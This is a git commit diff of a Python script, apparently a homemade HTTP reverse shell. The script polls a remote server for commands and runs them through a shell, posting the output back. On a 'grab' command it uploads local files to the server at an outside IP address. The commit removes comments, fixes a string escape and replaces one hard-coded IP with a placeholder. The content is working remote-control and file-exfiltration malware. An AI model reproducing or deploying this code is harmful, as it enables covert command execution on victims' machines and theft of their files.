f267f6ba7f2316c0bc67ffa00bd6c659cd221e16
ddshah001 <ddshah001@gmail.com>
2019-04-10 00:32:49 +0530

    Update httpclidata.py

--- httpclidata.py
+++ httpclidata.py
@@ -11,7 +11,7 @@ while True:
     command = req.text
         
     if 'terminate' in command:
-        break 
+        break # end the loop
 
 
 
@@ -19,21 +19,21 @@ while True:
 
     elif 'grab' in command:
         
-        grab,path=command.split('*') # split the received grab command into two parts and store the second part in path variable
+        grab,path=command.split('*') 
         
-        if os.path.exists(path): # check if the file is there
+        if os.path.exists(path):
             
-            filename = path.split('\')
+            filename = path.split('\\')
             url = 'http://111.111.11.11/store?' + filename[-1] # Appended /store in the URL
-            files = {'file': open(path, 'rb')} # Add a dictionary key called 'file' where the key value is the file itself
-            r = requests.post(url, files=files) # Send the file and behind the scenes, requests library use POST method called "multipart/form-data"
+            files = {'file': open(path, 'rb')} 
+            r = requests.post(url, files=files) 
             
         else:
-            post_response = requests.post(url='http://52.66.95.129', data='[-] Not able to find the file !' )
+            post_response = requests.post(url='http://111.111.11.11', data='[-] Not able to find the file !' )
             
     else:
         CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        post_response = requests.post(url='http://52.66.95.129', data=CMD.stdout.read() )
-        post_response = requests.post(url='http://52.66.95.129', data=CMD.stderr.read() )
-
+        post_response = requests.post(url='http://111.111.11.11', data=CMD.stdout.read() )
+        post_response = requests.post(url='http://111.111.11.11', data=CMD.stderr.read() )
+        
     time.sleep(3)
